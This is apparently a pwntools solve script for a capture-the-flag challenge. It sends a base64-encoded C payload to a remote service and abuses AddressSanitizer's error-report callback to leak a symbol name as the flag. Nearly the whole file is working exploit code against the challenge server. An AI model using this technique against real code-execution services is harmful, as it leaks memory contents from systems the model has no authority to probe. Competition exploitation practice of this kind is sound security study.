#!/usr/bin/env python3
import base64
import time

from pwn import *

LOCAL = 'local' in sys.argv
DEBUG = 'debug' in sys.argv or 'dbg' in sys.argv

if LOCAL:
    HOST = '127.0.0.1'
else:
    HOST = 'chall.polygl0ts.ch'

PORT = 3000

r = remote(HOST, PORT)

# Payload
s = """
#include "sanitizer/asan_interface.h"

void callback() {

    char name[100];
    void *region_address;
    size_t region_size;
    void *addr;

    addr = __asan_get_report_address();
    __asan_locate_address(addr, name, 100, &region_address, &region_size);

    printf("%s\\n", name);
    fflush(stdout);
}

void __asan_on_error() {
    __asan_set_error_report_callback(&callback);
}
"""
payload = base64.b64encode(s.encode('utf-8'))
if DEBUG:
    print('base64 payload:')
    print(payload)


# Send payload
r.sendlineafter(b'input: ', payload)
time.sleep(1)
r.sendlineafter(b'you got...', b'10')

# Get flag
flag = r.recvall().decode('utf-8').strip()
print('EPFL{' + flag + '}')

